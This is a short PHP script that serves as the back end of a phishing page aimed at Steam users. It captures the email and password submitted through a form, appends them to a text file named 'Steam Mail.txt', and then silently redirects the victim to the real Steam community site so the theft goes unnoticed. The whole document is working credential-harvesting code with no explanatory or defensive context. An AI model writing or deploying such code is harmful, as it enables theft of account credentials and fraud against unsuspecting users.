<?PHP
$Log = $_POST['email'];
$Pass = $_POST['pass'];
$log = fopen("Steam Mail.txt","at");
fwrite($log,"$Log:$Pass\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://steamcommunity.com/'></head></html>";
?>